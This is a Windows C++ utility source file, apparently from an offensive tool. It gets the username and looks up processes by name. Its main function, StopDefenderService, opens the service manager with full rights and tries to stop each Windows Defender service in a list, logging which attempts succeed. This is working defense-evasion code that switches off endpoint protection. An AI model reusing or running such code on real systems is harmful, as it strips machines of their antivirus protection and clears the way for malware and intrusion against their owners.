#include "stdafx.h"
#include <windows.h>
#include <iostream>
#include <tlhelp32.h>
#include <Lmcons.h>
#include <tchar.h>
#include "util.h"

using namespace std;

wstring get_usernameW()
{
	TCHAR username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserName(username, &username_len);
	std::wstring username_w(username);
	return username_w;
}

string get_usernameA()
{
	TCHAR username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserName(username, &username_len);
	std::wstring username_w(username);
	std::string username_s(username_w.begin(), username_w.end());
	return username_s;
}

BOOL StopDefenderService() {
	SERVICE_STATUS_PROCESS ssp;
	BOOL retSuccess = FALSE;

	SC_HANDLE schSCManager = OpenSCManager(
		NULL,                    // local computer
		NULL,                    // ServicesActive database 
		SC_MANAGER_ALL_ACCESS);  // full access rights 

	if (NULL == schSCManager)
	{
		_tprintf(TEXT("[-] OpenSCManager failed (%d)\n"), GetLastError());
		return FALSE;
	}

	_tprintf(TEXT("[+] OpenSCManager success!\n"));

	for (int i = 0; i < DEF_SERVICES_COUNT; i++) {

		SC_HANDLE schService = OpenService(
			schSCManager,         // SCM database 
			DefenderServices[i],
			SERVICE_STOP |
			SERVICE_QUERY_STATUS |
			SERVICE_ENUMERATE_DEPENDENTS);

		if (schService == NULL)
		{
			_tprintf(TEXT("[-] OpenService %s failed (%d)\n"), DefenderServices[i], GetLastError());
			//CloseServiceHandle(schSCManager);
			//return FALSE;
			continue;
		}

		_tprintf(TEXT("[+] OpenService %s success!\n"), DefenderServices[i]);

		//Stopping service

		if (!ControlService(
			schService,
			SERVICE_CONTROL_STOP,
			(LPSERVICE_STATUS)&ssp) && GetLastError() != ERROR_SERVICE_NOT_ACTIVE
			)
		{
			_tprintf(TEXT("[-] Stop attempt failed ( Error %d)\n"), GetLastError());
			CloseServiceHandle(schService);
			//CloseServiceHandle(schSCManager);
			continue;
			//return FALSE;
		}

		_tprintf(TEXT("[+] %s stopped successfully!\n"), DefenderServices[i]);
		CloseServiceHandle(schService);
		retSuccess = TRUE;
	}

	CloseServiceHandle(schSCManager);

	return retSuccess;

}

int GetProcessByName(PCTSTR name)
{
	DWORD pid = 0;

	// Create toolhelp snapshot.
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 process;
	ZeroMemory(&process, sizeof(process));
	process.dwSize = sizeof(process);

	// Walkthrough all processes.
	if (Process32First(snapshot, &process))
	{
		do
		{
			// Compare process.szExeFile based on format of name, i.e., trim file path
			// trim .exe if necessary, etc.
			if (_tcscmp(process.szExeFile, name) == 0)
			{
				return process.th32ProcessID;
			}
		} while (Process32Next(snapshot, &process));
	}

	CloseHandle(snapshot);

	return NULL;
}